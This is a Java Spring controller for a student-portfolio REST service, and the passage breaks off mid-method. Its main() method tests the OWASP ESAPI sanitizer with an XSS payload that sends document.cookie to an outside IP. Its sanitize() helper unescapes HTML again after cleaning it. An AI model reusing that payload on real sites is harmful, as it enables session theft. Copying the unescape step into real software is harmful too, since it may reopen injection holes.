/*******************************************************************************
 * Copyright 2012-2013 Trento RISE
 * 
 *    Licensed under the Apache License, Version 2.0 (the "License");
 *    you may not use this file except in compliance with the License.
 *    You may obtain a copy of the License at
 * 
 *        http://www.apache.org/licenses/LICENSE-2.0
 * 
 *    Unless required by applicable law or agreed to in writing, software
 *    distributed under the License is distributed on an "AS IS" BASIS,
 *    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *    See the License for the specific language governing permissions and
 *    limitations under the License.
 ******************************************************************************/
package eu.trentorise.smartcampus.portfolio.controller.rest;

import it.sayservice.platform.client.DomainObject;
import it.sayservice.platform.client.InvocationException;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletInputStream;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang.StringEscapeUtils;
import org.apache.log4j.Logger;
import org.codehaus.jackson.map.ObjectMapper;
import org.owasp.esapi.ESAPI;
import org.owasp.esapi.Validator;
import org.owasp.esapi.errors.IntrusionException;
import org.owasp.esapi.errors.ValidationException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import eu.trentorise.smartcampus.ac.provider.AcServiceException;
import eu.trentorise.smartcampus.ac.provider.filters.AcProviderFilter;
import eu.trentorise.smartcampus.ac.provider.model.User;
import eu.trentorise.smartcampus.portfolio.manager.PortfolioManager;
import eu.trentorise.smartcampus.portfolio.manager.ProfileManager;
import eu.trentorise.smartcampus.portfolio.models.Portfolio;
import eu.trentorise.smartcampus.portfolio.models.SharedPortfolioContainer;
import eu.trentorise.smartcampus.portfolio.models.StudentData;
import eu.trentorise.smartcampus.portfolio.models.StudentExams;
import eu.trentorise.smartcampus.portfolio.models.StudentInfo;
import eu.trentorise.smartcampus.portfolio.models.UserData;
import eu.trentorise.smartcampus.portfolio.models.UserProducedData;
import eu.trentorise.smartcampus.portfolio.util.PortfolioUtils;
import eu.trentorise.smartcampus.presentation.common.exception.DataException;
import eu.trentorise.smartcampus.presentation.common.exception.NotFoundException;
import eu.trentorise.smartcampus.presentation.common.util.Util;
import eu.trentorise.smartcampus.presentation.storage.BasicObjectStorage;

@Controller
public class PortfolioController extends SCController {

	// @Autowired
	// private DomainEngineClient domainClient;

	// @Autowired
	// private AcService acService;

	@Autowired
	private PortfolioManager portfolioManager;

	@Autowired
	private ProfileManager profileManager;
	@Autowired
	private BasicObjectStorage storage;

	@Autowired
	// http://vas.sc.trentorise.eu/smartcampus.vas.community-manager.web
	@Value("${smartcampus.vas.communitymanager.uri}")
	private String profileServiceUri;
	// private static final String ID_ADA = "idada";

	private Validator validator = ESAPI.validator();
	private static final int INPUT_MAX_LENGTH = 9999;

	private Logger log = Logger.getLogger(this.getClass());

	// STUDENT PERSONAL DATA FROM ADA

	@RequestMapping(method = RequestMethod.POST, value = "/createstudent")
	public @ResponseBody
	Boolean createStudent(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}

			String unitnId = getIdAda(user);

			if (unitnId == null) {
				return false;
			}

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// pars.put("newUserId", userId);
			// pars.put("newIdAda", unitnId);
			// byte[] b = (byte[]) domainClient.invokeDomainOperationSync(
			// "createStudent",
			// "smartcampus.services.esse3.StudentFactory",
			// "smartcampus.services.esse3.StudentFactory.0", pars,
			// "vas_portfolio_subscriber");
			// String result = (String) ServiceUtil.deserializeObject(b);
			// return Boolean.parseBoolean(result);
			portfolioManager.createStudent(userId, unitnId);
			return true;
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return null;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/smartcampus.services.esse3.StudentInfo")
	public @ResponseBody
	String getStudentInfo(HttpServletRequest request, HttpServletResponse response) throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// TODO: query ADA, if idADA == null, build a StudentInfo-like json
			// from
			// AC user

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// pars.put("userId", userId);
			// List<String> result = domainClient.searchDomainObjects(
			// "smartcampus.services.esse3.StudentInfo", pars,
			// "vas_portfolio_subscriber");
			// if (result != null && result.size() > 0) {
			// return result.get(0);
			// }

			return portfolioManager.getStudentInfo(userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.GET, value = "/smartcampus.services.esse3.StudentExams")
	public @ResponseBody
	String getStudentExams(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// TODO: query ADA, if idADA == null, return nothing

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// pars.put("userId", userId);
			// List<String> result = domainClient.searchDomainObjects(
			// "smartcampus.services.esse3.StudentExams", pars,
			// "vas_portfolio_subscriber");
			// if (result != null && result.size() > 0) {
			// return result.get(0);
			// }
			return portfolioManager.getStudentExams(userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	// PORTFOLIOS

	@RequestMapping(method = RequestMethod.GET, value = "/smartcampus.services.esse3.Portfolio")
	public @ResponseBody
	String getStudentPortfolios(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		return PortfolioUtils.listToJSON(getStudentPortfoliosList(request, response));
	}

	private List<String> getStudentPortfoliosList(HttpServletRequest request, HttpServletResponse response) {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// pars.put("userId", userId);
			// List<String> res = domainClient.searchDomainObjects(
			// "smartcampus.services.esse3.Portfolio", pars,
			// "vas_portfolio_subscriber");
			//
			// return listToJSON(res);
			return portfolioManager.getStudentPortfolios(userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			return null;
		}
	}

	@RequestMapping(method = RequestMethod.POST, value = "/smartcampus.services.esse3.Portfolio")
	public @ResponseBody
	String createPortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// Map<String, Object> json = (Map<String, Object>)
			// extractContent(request, Map.class);
			// return portfolioManager.createPortfolio(json, userId,
			// user.getSocialId());

			Portfolio portfolio = (Portfolio) extractContent(request, Portfolio.class);
			portfolio = sanitize(portfolio);
			return portfolioManager.createPortfolio(portfolio, userId, user.getSocialId());
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.PUT, value = "/smartcampus.services.esse3.Portfolio/{id}")
	public @ResponseBody
	String updatePortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// Map<String, Object> json = (Map<String, Object>)
			// extractContent(request, Map.class);
			// portfolioManager.updatePortfolio(json, id, userId);
			Portfolio portfolio = (Portfolio) extractContent(request, Portfolio.class);
			portfolio = sanitize(portfolio);
			portfolioManager.updatePortfolio(portfolio, id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.DELETE, value = "/smartcampus.services.esse3.Portfolio/{id}")
	public @ResponseBody
	String deletePortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// // domainClient.invokeDomainOperation("deletePortfolio",
			// // "smartcampus.services.esse3.Portfolio", id, pars, id,
			// // "vas_portfolio_subscriber");
			// byte[] b = (byte[]) domainClient.invokeDomainOperationSync(
			// "deletePortfolio", "smartcampus.services.esse3.Portfolio",
			// id, pars, "vas_portfolio_subscriber");
			// String result = (String) ServiceUtil.deserializeObject(b);
			// Long entityId = Long.parseLong(result);
			// SemanticHelper.deleteEntity(socialEngineClient, entityId);
			portfolioManager.deletePortfolio(id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	/*
	 * USER PRODUCED DATA
	 */
	@RequestMapping(method = RequestMethod.GET, value = "/smartcampus.services.esse3.UserProducedData")
	public @ResponseBody
	String getUserProducedDataAll(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws IOException, InvocationException {
		return PortfolioUtils.listToJSON(getUserProducedDataList(request, response, null));
	}

	@RequestMapping(method = RequestMethod.GET, value = "/smartcampus.services.esse3.UserProducedData/{category}")
	public @ResponseBody
	String getUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String category) throws IOException, InvocationException {
		return PortfolioUtils.listToJSON(getUserProducedDataList(request, response, category));
	}

	private List<String> getUserProducedDataList(HttpServletRequest request, HttpServletResponse response,
			String category) {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// pars.put("userId", userId);
			// pars.put("category", category);
			// List<String> res = domainClient.searchDomainObjects(
			// "smartcampus.services.esse3.UserProducedData", pars,
			// "vas_portfolio_subscriber");
			//
			// return listToJSON(res);
			return portfolioManager.getUserProducedData(userId, category);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			return null;
		}
	}

	@RequestMapping(method = RequestMethod.POST, value = "/smartcampus.services.esse3.UserProducedData")
	public @ResponseBody
	String createUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// Map<String, Object> json = (Map<String, Object>)
			// extractContent(request, Map.class);
			// portfolioManager.createUserProducedData(json, userId);

			UserProducedData upd = (UserProducedData) extractContent(request, UserProducedData.class);
			upd = sanitize(upd);
			portfolioManager.createUserProducedData(upd, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.PUT, value = "/smartcampus.services.esse3.UserProducedData/{id}")
	public @ResponseBody
	String updateUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// Map<String, Object> json = (Map<String, Object>)
			// extractContent(request, Map.class);
			// portfolioManager.updateUserProducedData(json, id, userId);

			UserProducedData upd = (UserProducedData) extractContent(request, UserProducedData.class);
			upd = sanitize(upd);
			portfolioManager.updateUserProducedData(upd, id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	@RequestMapping(method = RequestMethod.DELETE, value = "/smartcampus.services.esse3.UserProducedData/{id}")
	public @ResponseBody
	String deleteUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// Map<String, Object> pars = new TreeMap<String, Object>();
			// domainClient.invokeDomainOperation("deleteUserProducedData",
			// "smartcampus.services.esse3.UserProducedData", id, pars,
			// id, "vas_portfolio_subscriber");
			portfolioManager.deleteUserProducedData(id, userId);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	// GENERIC OBJECT

	@RequestMapping(method = RequestMethod.GET, value = "/object/{id}/{type}")
	public @ResponseBody
	String getObjectById(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id, @PathVariable String type) throws IOException, InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return "";
			}

			// return domainClient.searchDomainObject(type, id,
			// "vas_portfolio_subscriber");
			String result = portfolioManager.getDomainObject(type, id);
			if (result != null) {
				DomainObject o = new DomainObject(result);
				if (!userId.equals(o.getContent().get("userId"))) {
					throw new SecurityException("Incorrect user");
				}
			}
			return result;
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	// USER PROFILE

	@RequestMapping(method = RequestMethod.GET, value = "/getprofile")
	public @ResponseBody
	String getProfile(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			Map<String, Object> prof = getProfileData(request, response);

			if (prof != null && !prof.values().contains(null)) {
				ObjectMapper mapper = new ObjectMapper();
				return mapper.writeValueAsString(prof);
			}
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
		return "";
	}

	private Map<String, Object> getProfileData(HttpServletRequest request, HttpServletResponse response)
			throws AcServiceException, Exception {
		User user = getUser(request);
		String userId = getUserId(user);
		if (userId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		Map<String, Object> prof = profileManager.getProfile(request.getHeader(AcProviderFilter.TOKEN_HEADER),
				profileServiceUri);
		return prof;
	}

	@RequestMapping(method = RequestMethod.POST, value = "/createprofile")
	public @ResponseBody
	void createProfile(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws InvocationException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			}

			Map<String, Object> json = (Map<String, Object>) extractContent(request, Map.class);
			if (json.containsKey("name") && json.containsKey("surname")) {
				ObjectMapper mapper = new ObjectMapper();
				json.put("userId", userId);
				profileManager.createProfile(request.getHeader(AcProviderFilter.TOKEN_HEADER),
						mapper.writeValueAsString(json), profileServiceUri);
			} else {
				response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
			}

		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}
	}

	// AC

	// private String getUserId(User user) {
	// return (user != null) ? user.getId().toString() : null;
	// }

	// private String getIdAda(User user) {
	// String idAda = null;
	// for (Attribute attr : user.getAttributes()) {
	// if (attr.getKey().equals(ID_ADA)) {
	// idAda = attr.getValue();
	// }
	// }
	// return idAda;
	// }

	// private User getUser(HttpServletRequest request) throws
	// AcServiceException {
	// String token = request.getHeader(AcProviderFilter.TOKEN_HEADER);
	// User user = acService.getUserByToken(token);
	// return user;
	// }

	// private Map<String, Object> getProfile(String token) throws Exception {
	// String address =
	// "http://vas.sc.trentorise.eu/smartcampus.vas.community-manager.web/eu.trentorise.smartcampus.cm.model.Profile/current";
	// Map<String, Object> reducedMap = new TreeMap<String, Object>();
	// try {
	// String result = HTTPConnector.doGet(address, null, null, null,
	// token);
	// if (result != null) {
	// ObjectMapper mapper = new ObjectMapper();
	// Map<String, Object> map = mapper.readValue(result, Map.class);
	// reducedMap.put("name", map.get("name"));
	// reducedMap.put("surname", map.get("surname"));
	// }
	// } catch (Exception e) {
	// return null;
	// }
	// return reducedMap;
	// }

	// private String createProfile(String token, String json) throws Exception
	// {
	// String address =
	// "http://vas.sc.trentorise.eu/smartcampus.vas.community-manager.web/eu.trentorise.smartcampus.cm.model.StoreProfile";
	// String result = null;
	// try {
	// result = HTTPConnector.doPost(address, json, null,
	// MediaType.APPLICATION_JSON, token);
	// } catch (Exception e) {
	// return null;
	// }
	// return result;
	// }

	// private String createProfile(String token, String name, String surname)
	// throws Exception {
	// String address =
	// "http://vas.sc.trentorise.eu/smartcampus.vas.community-manager.web/eu.trentorise.smartcampus.cm.model.StoreProfile";
	// String request = "{ \"name\" : \"" + name + "\", \"surname\" : \"" +
	// surname + "\"}";
	// String result = null;
	// try {
	// result = HTTPConnector.doPost(address, request, null,
	// MediaType.APPLICATION_JSON, token);
	// } catch (Exception e) {
	// return null;
	// }
	// return result;
	// }

	// private User getUser(HttpServletRequest request) {
	// try {
	// String token = request.getHeader(AcProviderFilter.TOKEN_HEADER);
	// User user = acService.getUserByToken(token);
	// return user;
	// } catch (Exception e) {
	// e.printStackTrace();
	// return null;
	// }
	// }

	@SuppressWarnings("unused")
	private String extractContentAsString(ServletRequest request) throws IOException {
		ServletInputStream sis = request.getInputStream();
		int c;
		String s = "";
		while ((c = sis.read()) != -1) {
			s += (char) c;
		}
		return s;
	}

	private Object extractContent(ServletRequest request, Class<?> clz) {
		try {
			ServletInputStream sis = request.getInputStream();
			ObjectMapper mapper = new ObjectMapper();
			Object obj = mapper.readValue(sis, clz);
			return obj;
		} catch (Exception e) {
			log.error("Error converting request to " + clz.getName());
		}
		return null;
	}

	private String sanitize(String s) throws ValidationException, IntrusionException {
		s = validator.getValidSafeHTML("string", s, INPUT_MAX_LENGTH, true);
		s = StringEscapeUtils.unescapeHtml(s);
		return s;
	}

	public static void main(String[] args) throws ValidationException, IntrusionException {
		String s = ESAPI.validator().getValidSafeHTML("string", "<A HREF=\"javascript:document.location='http://66.102.7.147/'+document.cookie\">XSS</A>", INPUT_MAX_LENGTH, true);
		s = StringEscapeUtils.unescapeHtml(s);
		System.err.println(s);
	}
	
	private UserProducedData sanitize(UserProducedData upd) throws ValidationException, IntrusionException {
		if (!upd.getTitle().isEmpty()) {
			upd.setTitle(sanitize(upd.getTitle()));
		}
		if (!upd.getSubtitle().isEmpty()) {
			upd.setSubtitle(sanitize(upd.getSubtitle()));
		}
		if (!upd.getContent().isEmpty()) {
			upd.setContent(sanitize(upd.getContent()));
		}
		return upd;
	}

	private UserData sanitize(UserData userdata) throws ValidationException, IntrusionException {
		if (!userdata.getNotes().isEmpty()) {
			userdata.setNotes(sanitize(userdata.getNotes()));
		}
		return userdata;
	}

	private Portfolio sanitize(Portfolio portfolio) throws ValidationException, IntrusionException {
		if (!portfolio.getName().isEmpty()) {
			portfolio.setName(sanitize(portfolio.getName()));
		}

		List<String> list;

		// showUserGeneratedData
		if (portfolio.getShowUserGeneratedData() != null && !portfolio.getShowUserGeneratedData().isEmpty()) {
			list = new ArrayList<String>();
			for (String s : portfolio.getShowUserGeneratedData()) {
				s = sanitize(s);
				if (s != null && !s.isEmpty()) {
					list.add(s);
				}
			}
			portfolio.setShowUserGeneratedData(list);
		}

		// highlightUserGeneratedData
		if (portfolio.getHighlightUserGeneratedData() != null && !portfolio.getHighlightUserGeneratedData().isEmpty()) {
			list = new ArrayList<String>();
			for (String s : portfolio.getHighlightUserGeneratedData()) {
				s = sanitize(s);
				if (s != null && !s.isEmpty()) {
					list.add(s);
				}
			}
			portfolio.setHighlightUserGeneratedData(list);
		}

		// showStudentInfo
		if (portfolio.getShowStudentInfo() != null && !portfolio.getShowStudentInfo().isEmpty()) {
			list = new ArrayList<String>();
			for (String s : portfolio.getShowStudentInfo()) {
				s = sanitize(s);
				if (s != null && !s.isEmpty()) {
					list.add(s);
				}
			}
			portfolio.setShowStudentInfo(list);
		}

		return portfolio;
	}

	// private String listToJSON(List<String> list) {
	// List<String> sorted = sortByTimestamp(list);
	// if (sorted == null) {
	// sorted = list;
	// }
	//
	// String result = "[";
	// for (String r : sorted) {
	// result += r + ",";
	// }
	//
	// if (result.length() > 1) {
	// result = result.substring(0, result.length() - 1);
	// }
	// result += "]";
	// return result;
	// }

	// private List<String> sortByTimestamp(List<String> list) {
	// List<String> result = new ArrayList<String>();
	// List<DomainObject> objects = new ArrayList<DomainObject>();
	// Map<DomainObject, String> objectsMap = new HashMap<DomainObject,
	// String>();
	//
	// try {
	// for (String s : list) {
	// DomainObject obj = new DomainObject(s);
	// objects.add(obj);
	// objectsMap.put(obj, s);
	// }
	// } catch (Exception e) {
	// log.error("Unable to sort: cannot convert list element to domain object.");
	// return null;
	// }
	//
	// Collections.sort(objects, new Comparator<DomainObject>() {
	//
	// @Override
	// public int compare(DomainObject o1, DomainObject o2) {
	// if (!o1.getContent().containsKey("timestamp")
	// || !o2.getContent().containsKey("timestamp")) {
	// return 0;
	// }
	// long timestamp1 = (Long) o1.getContent().get("timestamp");
	// long timestamp2 = (Long) o2.getContent().get("timestamp");
	//
	// return (int) (timestamp1 - timestamp2);
	//
	// }
	// });
	//
	// for (DomainObject obj : objects) {
	// result.add(objectsMap.get(obj));
	// }
	//
	// Collections.reverse(result);
	//
	// return result;
	//
	// }

	/*
	 * Methods for mobile's RemoteStorage
	 */
	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.StudentInfo")
	public @ResponseBody
	List<StudentInfo> getStudentInfo_Remote(HttpServletRequest request, HttpServletResponse response) throws Exception {
		StudentInfo si = new StudentInfo();

		String studentInfo = getStudentInfo(request, response);
		if (studentInfo != null && !studentInfo.isEmpty()) {
			DomainObject obj = new DomainObject(studentInfo);
			si = PortfolioUtils.convert(obj.getContent(), StudentInfo.class);
			si.setId(obj.getId());
		} else {
			User user = getUser(request);
			si.setUserId(getUserId(user));
		}

		Map<String, Object> profileMap = getProfileData(request, response);
		if (profileMap != null) {
			StudentData sd = si.getStudentData();
			if (sd == null) {
				sd = new StudentData();
				si.setStudentData(sd);
			}
			sd.setName((String) profileMap.get("name"));
			sd.setSurname((String) profileMap.get("surname"));
		}

		return Collections.singletonList(si);
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.StudentExams")
	public @ResponseBody
	List<StudentExams> getStudentExams_Remote(HttpServletRequest request, HttpServletResponse response,
			HttpSession session) throws Exception {
		List<StudentExams> seList = new ArrayList<StudentExams>();
		String seString = getStudentExams(request, response, session);

		if (seString != null && !seString.isEmpty()) {
			DomainObject obj = new DomainObject(seString);
			StudentExams p = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
			p.setId(obj.getId());
			seList.add(p);
		}

		return seList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.UserProducedData")
	public @ResponseBody
	List<UserProducedData> getUserProducedDataAll_Remote(HttpServletRequest request, HttpServletResponse response,
			HttpSession session) throws Exception {
		List<UserProducedData> updList = new ArrayList<UserProducedData>();
		List<String> list = getUserProducedDataList(request, response, null);

		if (list != null) {
			for (String s : list) {
				DomainObject obj = new DomainObject(s);
				UserProducedData p = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
				p.setId(obj.getId());
				updList.add(p);
			}
		}

		return updList;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.Portfolio")
	public @ResponseBody
	List<Portfolio> getStudentPortfolios_Remote(HttpServletRequest request, HttpServletResponse response,
			HttpSession session) throws Exception {
		List<Portfolio> portfoliosList = new ArrayList<Portfolio>();
		List<String> list = getStudentPortfoliosList(request, response);

		if (list != null) {
			for (String s : list) {
				DomainObject obj = new DomainObject(s);
				Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
				p.setId(obj.getId());
				portfoliosList.add(p);
			}
		}

		return portfoliosList;
	}

	@RequestMapping(method = RequestMethod.POST, value = "/eu.trentorise.smartcampus.portfolio.models.Portfolio")
	public @ResponseBody
	Portfolio createPortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
			throws Exception {
		Portfolio portfolio = null;
		String portfolioString = createPortfolio(request, response, session);

		if (portfolioString != null && !portfolioString.isEmpty()) {
			DomainObject obj = new DomainObject(portfolioString);
			portfolio = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
			portfolio.setId(obj.getId());
		}

		return portfolio;
	}

	@RequestMapping(method = RequestMethod.PUT, value = "/eu.trentorise.smartcampus.portfolio.models.Portfolio/{id}")
	public @ResponseBody
	String updatePortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		return updatePortfolio(request, response, session, id);
	}

	@RequestMapping(method = RequestMethod.DELETE, value = "/eu.trentorise.smartcampus.portfolio.models.Portfolio/{id}")
	public @ResponseBody
	String deletePortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable String id) throws InvocationException {
		return deletePortfolio(request, response, session, id);
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.UserData")
	public @ResponseBody
	List<UserData> getUserData(HttpServletRequest request, HttpServletResponse response) throws AcServiceException,
			DataException, NotFoundException {
		User user = getUser(request);
		String userId = getUserId(user);
		if (userId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}
		UserData data;
		try {
			data = storage.getObjectById(userId, UserData.class);
		} catch (NotFoundException e) {
			data = new UserData();
			data.setId(userId);
			data.setUser(userId);
			storage.storeObject(data);
		}
		return Collections.singletonList(data);

	}

	@RequestMapping(method = RequestMethod.PUT, value = "/eu.trentorise.smartcampus.portfolio.models.UserData/{id}")
	public @ResponseBody
	UserData updateUserData(HttpServletRequest request, HttpServletResponse response, @PathVariable String id,
			@RequestBody Map<String, Object> obj) throws AcServiceException, DataException {
		try {
			User user = getUser(request);
			String userId = getUserId(user);
			if (userId == null) {
				response.setStatus(HttpServletResponse.SC_FORBIDDEN);
				return null;
			}
			UserData data = Util.convert(obj, UserData.class);
			data = sanitize(data);
			data.setUser(userId);
			data.setId(userId);
			storage.storeObject(data);
		} catch (Exception e) {
			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
		}

		return null;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.Portfolio/entity/{entityId}")
	public @ResponseBody
	Portfolio getPortfolioByEntityId(HttpServletRequest request, HttpServletResponse response, HttpSession session,
			@PathVariable Long entityId) throws Exception {

		// check the current user
		User user = getUser(request);
		String currentUserId = getUserId(user);
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getPortfolioByEntityId(entityId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
		p.setId(obj.getId());

		// check if can access portfolio
		if (!canRead(user.getSocialId(), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}
		return p;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.StudentInfo/portfolio/{portfolioId}")
	public @ResponseBody
	StudentInfo getStudentInfoByPortfolio(HttpServletRequest request, HttpServletResponse response,
			HttpSession session, @PathVariable String portfolioId) throws Exception {
		StudentInfo si = new StudentInfo();

		// check the current user
		User user = getUser(request);
		String currentUserId = getUserId(user);
		if (currentUserId == null) {
			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
			return null;
		}

		// read the portfolio first
		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
		if (portfolioString == null)
			return null;
		DomainObject obj = new DomainObject(portfolioString);
		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);

		// check if can access portfolio
		if (!canRead(user.getSocialId(), p.getEntityId())) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<StudentInfo> list = getStudentInfo_Remote(request, response);
		if (list != null && list.isEmpty()) {
			si = list.get(0);
		} else {
			Map<String, Object> profileMap = profileManager.getMinimalProfile(p.getUserId(),
					request.getHeader(AcProviderFilter.TOKEN_HEADER), profileServiceUri);
			if (profileMap != null) {
				StudentData sd = si.getStudentData();
				if (sd == null) {
					sd = new StudentData();
					si.setStudentData(sd);
				}
				sd.setName((String) profileMap.get("name"));
				sd.setSurname((String) profileMap.get("surname"));
			}
			return si;
		}

		if (p.getUserId().equals(currentUserId)) {
			return si;
		} else {
			// filter student info
			List<String> showInfo = p.getShowStudentInfo();
			si.getStudentData().filterData(showInfo);
		}

		return si;
	}

	@RequestMapping(method = RequestMethod.GET, value = "/eu.trentorise.smartcampus.portfolio.models.StudentExams/portfolio/{portfolioId}")
	public @ResponseBody
	List<StudentExams> getStudentExamsByPortfolio(HttpServletRequest request, HttpServletResponse response,
			HttpSession session, @PathVariable String portfolioId) throws Exception {
		List<StudentExams> seList = new ArrayList<StudentExams>();

		// check the current user
		User user = getUser(request);
		String currentUserId = getUserId(user);
